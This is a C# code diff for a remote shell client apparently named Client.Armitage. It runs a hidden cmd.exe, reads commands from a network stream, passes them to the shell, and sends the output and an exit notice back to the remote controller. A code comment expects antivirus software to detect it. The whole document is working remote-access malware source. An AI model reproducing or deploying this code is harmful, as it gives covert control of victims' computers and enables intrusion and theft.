@@ -9,7 +9,7 @@ using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 
-namespace Client.Armitage
+namespace Client.Armitage.Shell
 {
     /*
      * I'm pretty sure this class is going to get detected by AV.
@@ -66,10 +66,11 @@ namespace Client.Armitage
                     _shell.BeginOutputReadLine();
 
                     _shell.BeginErrorReadLine();
+
                 }
-                catch
+                catch (Exception ex)
                 {
-                    // what?
+
                 }
                 finally
                 {
@@ -81,11 +82,29 @@ namespace Client.Armitage
 
                             int byteCount = _stream.Read(receivedBytes, 0, receivedBytes.Length);
 
-                            string commandString = Encoding.ASCII.GetString(receivedBytes);
+                            var commandtype = (Command_Types)receivedBytes.FirstOrDefault();
 
-                            Console.WriteLine("Received: " + commandString);
+                            receivedBytes = receivedBytes.Skip(1).ToArray();
 
-                            _shell.StandardInput.WriteLine(commandString);
+                            if (receivedBytes.Length > 0)
+                            {
+                                switch (commandtype) {
+
+                                    case Command_Types.CMDCommand:
+
+                                        string commandString = Encoding.ASCII.GetString(receivedBytes);
+
+                                        Console.WriteLine("Received: " + commandString);
+
+                                        _shell.StandardInput.WriteLine(commandString);
+
+                                        _shell.StandardInput.Flush();
+
+                                        break;
+                                }
+                            
+                            }
+
                         }
                         catch (Exception ex) // got disconnected
                         {
@@ -110,8 +129,15 @@ namespace Client.Armitage
         {
             if (e.Data != null && _client.Connected && _stream != null)
             {
-                var bytes = Encoding.ASCII.GetBytes(e.Data + Environment.NewLine);
-                _stream.Write(bytes, 0, bytes.Length);
+                Console.WriteLine(e.Data + Environment.NewLine);
+
+                var bytes = new List<byte>() { (byte)Message_Types.CMDMessage };
+
+                bytes.AddRange(Encoding.ASCII.GetBytes(e.Data + Environment.NewLine));
+
+                _stream.Write(bytes.ToArray(), 0, bytes.Count);
+
+                _stream.Flush();
             }
         }
 
@@ -121,7 +147,9 @@ namespace Client.Armitage
             // create cmd
             Process p = new Process();
 
-            p.StartInfo.FileName = "cmd";
+            p.StartInfo.FileName = "cmd.exe";
+
+            p.EnableRaisingEvents = true;
 
             p.StartInfo.CreateNoWindow = true;
 
@@ -132,6 +160,17 @@ namespace Client.Armitage
             p.StartInfo.RedirectStandardInput = true;
 
             p.StartInfo.RedirectStandardError = true;
+
+            p.Exited += (po, o) => {
+                if (_stream != null)
+                {
+                    var bytes = new byte[] { (byte)Message_Types.Exited };
+
+                    _stream.Write(bytes, 0, bytes.Length);
+
+                    _stream.Flush();
+                }
+            };
 
             p.Start();
 
